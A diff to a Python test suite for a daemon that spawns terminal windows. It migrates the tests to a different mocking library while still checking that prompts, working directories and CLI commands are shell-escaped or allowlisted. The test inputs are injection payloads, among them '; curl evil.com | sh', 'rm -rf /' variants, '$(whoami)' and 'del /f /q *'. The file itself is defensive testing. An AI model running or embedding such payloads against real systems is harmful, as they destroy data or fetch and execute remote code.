@@ -12,9 +12,11 @@ import shlex
 import subprocess
 import sys
 import tempfile
+import types
+
+import bigfoot
 import pytest
 from pathlib import Path
-from unittest.mock import patch, MagicMock
 
 from spellbook.daemon.terminal import _escape_for_applescript
 
@@ -94,151 +96,166 @@ class TestAppleScriptEscaping:
         from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = "$(echo pwned)"
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_macos_terminal(
                 terminal="terminal",
                 prompt=prompt,
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            osascript_cmd = call_args[0][0]
-            applescript = osascript_cmd[2]
 
-            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
-            assert applescript == expected_applescript
-            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
+        mock_popen.assert_call(
+            args=(["osascript", "-e", expected_applescript],),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_semicolon_in_prompt_is_escaped(self):
         """A prompt containing semicolons must be shlex-quoted, preventing command chaining."""
         from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = '"; rm -rf / #'
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_macos_terminal(
                 terminal="terminal",
                 prompt=prompt,
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            osascript_cmd = call_args[0][0]
-            applescript = osascript_cmd[2]
 
-            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
-            assert applescript == expected_applescript
-            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
+        mock_popen.assert_call(
+            args=(["osascript", "-e", expected_applescript],),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_backtick_in_prompt_is_escaped(self):
         """Backtick command substitution must be neutralized by shlex.quote."""
         from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = "`rm -rf /`"
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_macos_terminal(
                 terminal="terminal",
                 prompt=prompt,
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            osascript_cmd = call_args[0][0]
-            applescript = osascript_cmd[2]
 
-            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
-            assert applescript == expected_applescript
-            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
+        mock_popen.assert_call(
+            args=(["osascript", "-e", expected_applescript],),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_working_directory_is_escaped(self):
         """working_directory with shell metacharacters must be shlex-quoted."""
         from spellbook.daemon.terminal import spawn_macos_terminal
 
         malicious_wd = '/tmp/$(whoami)'
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_applescript = _expected_macos_applescript("terminal", "hello", malicious_wd, "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_macos_terminal(
                 terminal="terminal",
                 prompt="hello",
                 working_directory=malicious_wd,
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            osascript_cmd = call_args[0][0]
-            applescript = osascript_cmd[2]
 
-            expected_applescript = _expected_macos_applescript("terminal", "hello", malicious_wd, "claude")
-            assert applescript == expected_applescript
-            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
+        mock_popen.assert_call(
+            args=(["osascript", "-e", expected_applescript],),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_iterm2_uses_escaped_command(self):
         """iTerm2 AppleScript must use the escaped command in write text."""
         from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = "$(whoami)"
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=5678)
+        expected_applescript = _expected_macos_applescript("iterm2", prompt, "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=5678))
+
+        with bigfoot:
             result = spawn_macos_terminal(
                 terminal="iTerm2",
                 prompt=prompt,
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            osascript_cmd = call_args[0][0]
-            applescript = osascript_cmd[2]
 
-            expected_applescript = _expected_macos_applescript("iterm2", prompt, "/tmp", "claude")
-            assert applescript == expected_applescript
-            assert result == {"status": "spawned", "terminal": "iTerm2", "pid": 5678}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "iTerm2", "pid": 5678}
+        mock_popen.assert_call(
+            args=(["osascript", "-e", expected_applescript],),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_warp_uses_escaped_command(self):
         """Warp AppleScript must use the escaped command in keystroke."""
         from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = "; curl evil.com | sh"
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=9999)
+        expected_applescript = _expected_macos_applescript("warp", prompt, "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=9999))
+
+        with bigfoot:
             result = spawn_macos_terminal(
                 terminal="Warp",
                 prompt=prompt,
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            osascript_cmd = call_args[0][0]
-            applescript = osascript_cmd[2]
 
-            expected_applescript = _expected_macos_applescript("warp", prompt, "/tmp", "claude")
-            assert applescript == expected_applescript
-            assert result == {"status": "spawned", "terminal": "Warp", "pid": 9999}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "Warp", "pid": 9999}
+        mock_popen.assert_call(
+            args=(["osascript", "-e", expected_applescript],),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_popen_called_with_osascript(self):
         """subprocess.Popen must be called with ['osascript', '-e', script]."""
         from spellbook.daemon.terminal import spawn_macos_terminal
 
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_applescript = _expected_macos_applescript("terminal", "safe prompt", "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             spawn_macos_terminal(
                 terminal="terminal",
                 prompt="safe prompt",
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            osascript_cmd = call_args[0][0]
-            expected_applescript = _expected_macos_applescript("terminal", "safe prompt", "/tmp", "claude")
-            assert osascript_cmd == ["osascript", "-e", expected_applescript]
-            assert call_args[1] == {"stdout": subprocess.PIPE, "stderr": subprocess.PIPE}
-            assert mock_popen.call_count == 1
+
+        mock_popen.assert_call(
+            args=(["osascript", "-e", expected_applescript],),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
 
 class TestLinuxTerminalEscaping:
@@ -249,84 +266,96 @@ class TestLinuxTerminalEscaping:
         from spellbook.daemon.terminal import spawn_linux_terminal
 
         prompt = "$(echo pwned)"
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_cmd = _expected_linux_command("gnome-terminal", prompt, "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_linux_terminal(
                 terminal="gnome-terminal",
                 prompt=prompt,
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            cmd_list = call_args[0][0]
 
-            expected_cmd = _expected_linux_command("gnome-terminal", prompt, "/tmp", "claude")
-            assert cmd_list == expected_cmd
-            assert result == {"status": "spawned", "terminal": "gnome-terminal", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "gnome-terminal", "pid": 1234}
+        mock_popen.assert_call(
+            args=(expected_cmd,),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_working_directory_is_shell_escaped_linux(self):
         """working_directory must be shlex.quote'd in bash -c command."""
         from spellbook.daemon.terminal import spawn_linux_terminal
 
         malicious_wd = "/tmp/$(id)"
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_cmd = _expected_linux_command("xterm", "hello", malicious_wd, "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_linux_terminal(
                 terminal="xterm",
                 prompt="hello",
                 working_directory=malicious_wd,
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            cmd_list = call_args[0][0]
 
-            expected_cmd = _expected_linux_command("xterm", "hello", malicious_wd, "claude")
-            assert cmd_list == expected_cmd
-            assert result == {"status": "spawned", "terminal": "xterm", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "xterm", "pid": 1234}
+        mock_popen.assert_call(
+            args=(expected_cmd,),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_semicolon_in_prompt_escaped_linux(self):
         """Semicolons in prompt must be neutralized by shlex.quote."""
         from spellbook.daemon.terminal import spawn_linux_terminal
 
         prompt = "; rm -rf / ;"
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_cmd = _expected_linux_command("konsole", prompt, "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_linux_terminal(
                 terminal="konsole",
                 prompt=prompt,
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            cmd_list = call_args[0][0]
 
-            expected_cmd = _expected_linux_command("konsole", prompt, "/tmp", "claude")
-            assert cmd_list == expected_cmd
-            assert result == {"status": "spawned", "terminal": "konsole", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "konsole", "pid": 1234}
+        mock_popen.assert_call(
+            args=(expected_cmd,),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
     def test_terminator_double_escapes_command(self):
         """Terminator wraps the bash -c arg in shlex.quote for its -e flag."""
         from spellbook.daemon.terminal import spawn_linux_terminal
 
         prompt = "$(evil)"
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_cmd = _expected_linux_command("terminator", prompt, "/tmp", "claude")
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_linux_terminal(
                 terminal="terminator",
                 prompt=prompt,
                 working_directory="/tmp",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            cmd_list = call_args[0][0]
 
-            expected_cmd = _expected_linux_command("terminator", prompt, "/tmp", "claude")
-            assert cmd_list == expected_cmd
-            assert result == {"status": "spawned", "terminal": "terminator", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "terminator", "pid": 1234}
+        mock_popen.assert_call(
+            args=(expected_cmd,),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
+        )
 
 
 class TestWindowsTerminalEscaping:
@@ -337,69 +366,76 @@ class TestWindowsTerminalEscaping:
         from spellbook.daemon.terminal import spawn_windows_terminal
 
         prompt = 'test & del /f /q *'
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])
+        expected_cmd = ["wt", "-d", "C:\\Users\\test", "cmd", "/c", safe_cli_prompt]
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_windows_terminal(
                 terminal="windows-terminal",
                 prompt=prompt,
                 working_directory="C:\\Users\\test",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            cmd_list = call_args[0][0]
-            safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])
 
-            expected_cmd = ["wt", "-d", "C:\\Users\\test", "cmd", "/c", safe_cli_prompt]
-            assert cmd_list == expected_cmd
-            assert result == {"status": "spawned", "terminal": "windows-terminal", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "windows-terminal", "pid": 1234}
+        mock_popen.assert_call(
+            args=(expected_cmd,),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE, "creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)},
+        )
 
     def test_prompt_with_special_chars_pwsh(self):
         """Prompt with special characters must be properly escaped for PowerShell."""
         from spellbook.daemon.terminal import spawn_windows_terminal
 
         prompt = 'test & del *'
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        expected_cmd = ["pwsh", "-NoExit", "-Command",
+                       "Set-Location 'C:\\Users\\test'; & 'claude' 'test & del *'"]
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_windows_terminal(
                 terminal="pwsh",
                 prompt=prompt,
                 working_directory="C:\\Users\\test",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            cmd_list = call_args[0][0]
 
-            # PowerShell uses single-quoted strings (not list2cmdline) to
-            # prevent interpretation of $, `, and other PS metacharacters.
-            expected_cmd = ["pwsh", "-NoExit", "-Command",
-                           "Set-Location 'C:\\Users\\test'; & 'claude' 'test & del *'"]
-            assert cmd_list == expected_cmd
-            assert result == {"status": "spawned", "terminal": "pwsh", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "pwsh", "pid": 1234}
+        mock_popen.assert_call(
+            args=(expected_cmd,),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE, "creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)},
+        )
 
     def test_prompt_with_special_chars_cmd(self):
         """Prompt with special characters must be properly escaped for cmd."""
         from spellbook.daemon.terminal import spawn_windows_terminal
 
         prompt = 'test & del *'
-        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
-            mock_popen.return_value = MagicMock(pid=1234)
+        safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])
+        expected_cmd = ["cmd", "/c", "start", "cmd", "/k",
+                       f'cd /d "C:\\Users\\test" && {safe_cli_prompt}']
+
+        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen.returns(types.SimpleNamespace(pid=1234))
+
+        with bigfoot:
             result = spawn_windows_terminal(
                 terminal="cmd",
                 prompt=prompt,
                 working_directory="C:\\Users\\test",
                 cli_command="claude",
             )
-            call_args = mock_popen.call_args
-            cmd_list = call_args[0][0]
-            safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])
 
-            expected_cmd = ["cmd", "/c", "start", "cmd", "/k",
-                           f'cd /d "C:\\Users\\test" && {safe_cli_prompt}']
-            assert cmd_list == expected_cmd
-            assert result == {"status": "spawned", "terminal": "cmd", "pid": 1234}
-            assert mock_popen.call_count == 1
+        assert result == {"status": "spawned", "terminal": "cmd", "pid": 1234}
+        mock_popen.assert_call(
+            args=(expected_cmd,),
+            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE, "creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)},
+        )
 
 
 class TestWorkingDirectoryValidation:
@@ -472,138 +508,199 @@ class TestWorkingDirectoryValidation:
 class TestCLICommandAllowlist:
     """SPELLBOOK_CLI_COMMAND must be validated against an allowlist (Finding #13)."""
 
-    def test_malicious_cli_command_falls_back_to_claude(self):
+    def test_malicious_cli_command_falls_back_to_claude(self, monkeypatch):
         """A CLI command not in the allowlist falls back to 'claude'."""
         from spellbook.daemon.terminal import _get_cli_command
 
-        with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "rm -rf /; claude"}):
-            result = _get_cli_command()
+        monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "rm -rf /; claude")
+        result = _get_cli_command()
         assert result == "claude"
 
-    def test_valid_cli_commands_accepted(self):
+    def test_valid_cli_commands_accepted(self, monkeypatch):
         """All known CLI commands are accepted."""
         from spellbook.daemon.terminal import _get_cli_command
 
         for cmd in ["claude", "codex", "gemini", "opencode", "crush"]:
-            with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": cmd}):
-                result = _get_cli_command()
+            monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", cmd)
+            result = _get_cli_command()
             assert result == cmd
 
-    def test_path_based_cli_command_extracts_basename(self):
+    def test_path_based_cli_command_extracts_basename(self, monkeypatch):
         """A full path to a known CLI is accepted by extracting basename."""
         from spellbook.daemon.terminal import _get_cli_command
 
-        with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "/usr/local/bin/claude"}):
-            result = _get_cli_command()
+        monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "/usr/local/bin/claude")
+        result = _get_cli_command()
         assert result == "claude"
 
-    def test_path_to_unknown_command_falls_back(self):
+    def test_path_to_unknown_command_falls_back(self, monkeypatch):
         """A full path to an unknown command falls back to 'claude'."""
         from spellbook.daemon.terminal import _get_cli_command
 
-        with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "/usr/local/bin/evil"}):
-            result = _get_cli_command()
+        monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "/usr/local/bin/evil")
+        result = _get_cli_command()
         assert result == "claude"
 
-    def test_default_is_claude(self):
+    def test_default_is_claude(self, monkeypatch):
         """Without env var, default is 'claude'."""
         from spellbook.daemon.terminal import _get_cli_command
 
-        env = os.environ.copy()
-        env.pop("SPELLBOOK_CLI_COMMAND", None)
-        with patch.dict(os.environ, env, clear=True):
-            result = _get_cli_command()
+        monkeypatch.delenv("SPELLBOOK_CLI_COMMAND", raising=False)
+        result = _get_cli_command()
         assert result == "claude"
 
-    def test_spawn_terminal_window_uses_validated_cli(self):
+    def test_spawn_terminal_window_uses_validated_cli(self, monkeypatch):
         """spawn_terminal_window must use _get_cli_command when cli_command is None."""
-        from spellbook.daemon.terminal import spawn_terminal_window, _get_cli_command
+        from spellbook.daemon.terminal import spawn_terminal_window
 
-        with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "codex"}):
-            with patch("spellbook.daemon.terminal.spawn_macos_terminal") as mock_spawn:
-                with patch("sys.platform", "darwin"):
-                    mock_spawn.return_value = {"status": "spawned", "terminal": "t", "pid": 1}
-                    spawn_terminal_window("terminal", "hello", "/tmp")
-                    # cli_command should be the validated value from _get_cli_command
-                    mock_spawn.assert_called_once_with("terminal", "hello", "/tmp", "codex")
+        monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "codex")
+        monkeypatch.setattr("sys.platform", "darwin")
+
+        mock_spawn = bigfoot.mock("spellbook.daemon.terminal:spawn_macos_terminal")
+        mock_spawn.returns({"status": "spawned", "terminal": "t", "pid": 1})
+
+        with bigfoot:
+            spawn_terminal_window("terminal", "hello", "/tmp")
+
+        mock_spawn.assert_call(args=("terminal", "hello", "/tmp", "codex"))
 
 
 class TestTerminalEnvAllowlist:
     """$TERMINAL env var must be validated via shutil.which (Finding #11)."""
 
-    def test_malicious_terminal_rejected(self):
+    def test_malicious_terminal_rejected(self, monkeypatch):
         """An unknown $TERMINAL value that doesn't exist on PATH must be ignored."""
         from spellbook.daemon.terminal import detect_linux_terminal
 
-        with patch.dict(os.environ, {"TERMINAL": "/tmp/evil"}):
-            with patch("shutil.which", return_value=None):
-                with patch("spellbook.daemon.terminal.subprocess.run") as mock_run:
-                    # Make the fallback detection also find nothing
-                    mock_run.return_value = MagicMock(returncode=1)
-                    result = detect_linux_terminal()
+        monkeypatch.setenv("TERMINAL", "/tmp/evil")
+
+        mock_which = bigfoot.mock("shutil:which")
+        mock_which.returns(None)
+
+        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
+        # 5 common terminals in cascade, all not found
+        for _ in range(5):
+            mock_run.returns(types.SimpleNamespace(returncode=1))
+
+        with bigfoot:
+            result = detect_linux_terminal()
+
         # Must NOT return the malicious value; should fall through to detection
         assert result == "xterm"  # final fallback
+        mock_which.assert_call(args=("evil",))
+        bigfoot.log_mock.assert_log(
+            "WARNING",
+            "TERMINAL env var '/tmp/evil' not found via which(), falling back to detection",
+            "spellbook.daemon.terminal",
+        )
+        for terminal in ["gnome-terminal", "konsole", "xterm", "terminator", "alacritty"]:
+            mock_run.assert_call(
+                args=(["which", terminal],),
+                kwargs={"capture_output": True, "timeout": 5},
+            )
 
-    def test_known_terminal_in_env_accepted(self):
+    def test_known_terminal_in_env_accepted(self, monkeypatch):
         """A known terminal in $TERMINAL that exists via which() must be accepted."""
         from spellbook.daemon.terminal import detect_linux_terminal
 
-        with patch.dict(os.environ, {"TERMINAL": "alacritty"}):
-            with patch("shutil.which", return_value="/usr/bin/alacritty"):
-                result = detect_linux_terminal()
-        assert result == "alacritty"
+        monkeypatch.setenv("TERMINAL", "alacritty")
 
-    def test_full_path_to_known_terminal_accepted(self):
+        mock_which = bigfoot.mock("shutil:which")
+        mock_which.returns("/usr/bin/alacritty")
+
+        with bigfoot:
+            result = detect_linux_terminal()
+
+        assert result == "alacritty"
+        mock_which.assert_call(args=("alacritty",))
+
+    def test_full_path_to_known_terminal_accepted(self, monkeypatch):
         """$TERMINAL=/usr/bin/gnome-terminal extracts basename and validates."""
         from spellbook.daemon.terminal import detect_linux_terminal
 
-        with patch.dict(os.environ, {"TERMINAL": "/usr/bin/gnome-terminal"}):
-            with patch("shutil.which", return_value="/usr/bin/gnome-terminal"):
-                result = detect_linux_terminal()
-        assert result == "gnome-terminal"
+        monkeypatch.setenv("TERMINAL", "/usr/bin/gnome-terminal")
 
-    def test_terminal_not_on_path_falls_through(self):
+        mock_which = bigfoot.mock("shutil:which")
+        mock_which.returns("/usr/bin/gnome-terminal")
+
+        with bigfoot:
+            result = detect_linux_terminal()
+
+        assert result == "gnome-terminal"
+        mock_which.assert_call(args=("gnome-terminal",))
+
+    def test_terminal_not_on_path_falls_through(self, monkeypatch):
         """Even a reasonable-looking $TERMINAL must be rejected if which() fails."""
         from spellbook.daemon.terminal import detect_linux_terminal
 
-        with patch.dict(os.environ, {"TERMINAL": "kitty"}):
-            with patch("shutil.which", return_value=None):
-                with patch("spellbook.daemon.terminal.subprocess.run") as mock_run:
-                    # gnome-terminal found in fallback cascade
-                    def run_side_effect(cmd, **kwargs):
-                        if 'gnome-terminal' in cmd:
-                            return MagicMock(returncode=0)
-                        return MagicMock(returncode=1)
-                    mock_run.side_effect = run_side_effect
-                    result = detect_linux_terminal()
-        assert result == "gnome-terminal"
+        monkeypatch.setenv("TERMINAL", "kitty")
 
-    def test_empty_terminal_env_uses_detection_cascade(self):
+        mock_which = bigfoot.mock("shutil:which")
+        mock_which.returns(None)
+
+        # gnome-terminal is first in cascade, found immediately
+        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
+        mock_run.returns(types.SimpleNamespace(returncode=0))
+
+        with bigfoot:
+            result = detect_linux_terminal()
+
+        assert result == "gnome-terminal"
+        mock_which.assert_call(args=("kitty",))
+        bigfoot.log_mock.assert_log(
+            "WARNING",
+            "TERMINAL env var 'kitty' not found via which(), falling back to detection",
+            "spellbook.daemon.terminal",
+        )
+        mock_run.assert_call(
+            args=(["which", "gnome-terminal"],),
+            kwargs={"capture_output": True, "timeout": 5},
+        )
+
+    def test_empty_terminal_env_uses_detection_cascade(self, monkeypatch):
         """An empty $TERMINAL value must be treated as unset and use detection cascade."""
         from spellbook.daemon.terminal import detect_linux_terminal
 
-        with patch.dict(os.environ, {"TERMINAL": ""}):
-            with patch("spellbook.daemon.terminal.subprocess.run") as mock_run:
-                def run_side_effect(cmd, **kwargs):
-                    if 'konsole' in cmd:
-                        return MagicMock(returncode=0)
-                    return MagicMock(returncode=1)
-                mock_run.side_effect = run_side_effect
-                result = detect_linux_terminal()
-        assert result == "konsole"
+        monkeypatch.setenv("TERMINAL", "")
 
-    def test_no_terminal_env_uses_detection_cascade(self):
+        # gnome-terminal not found, konsole found
+        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
+        mock_run.returns(types.SimpleNamespace(returncode=1))
+        mock_run.returns(types.SimpleNamespace(returncode=0))
+
+        with bigfoot:
+            result = detect_linux_terminal()
+
+        assert result == "konsole"
+        mock_run.assert_call(
+            args=(["which", "gnome-terminal"],),
+            kwargs={"capture_output": True, "timeout": 5},
+        )
+        mock_run.assert_call(
+            args=(["which", "konsole"],),
+            kwargs={"capture_output": True, "timeout": 5},
+        )
+
+    def test_no_terminal_env_uses_detection_cascade(self, monkeypatch):
         """Without $TERMINAL set, detection cascade runs normally."""
         from spellbook.daemon.terminal import detect_linux_terminal
 
-        env = os.environ.copy()
-        env.pop("TERMINAL", None)
-        with patch.dict(os.environ, env, clear=True):
-            with patch("spellbook.daemon.terminal.subprocess.run") as mock_run:
-                def run_side_effect(cmd, **kwargs):
-                    if 'konsole' in cmd:
-                        return MagicMock(returncode=0)
-                    return MagicMock(returncode=1)
-                mock_run.side_effect = run_side_effect
-                result = detect_linux_terminal()
+        monkeypatch.delenv("TERMINAL", raising=False)
+
+        # gnome-terminal not found, konsole found
+        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
+        mock_run.returns(types.SimpleNamespace(returncode=1))
+        mock_run.returns(types.SimpleNamespace(returncode=0))
+
+        with bigfoot:
+            result = detect_linux_terminal()
+
         assert result == "konsole"
+        mock_run.assert_call(
+            args=(["which", "gnome-terminal"],),
+            kwargs={"capture_output": True, "timeout": 5},
+        )
+        mock_run.assert_call(
+            args=(["which", "konsole"],),
+            kwargs={"capture_output": True, "timeout": 5},
+        )
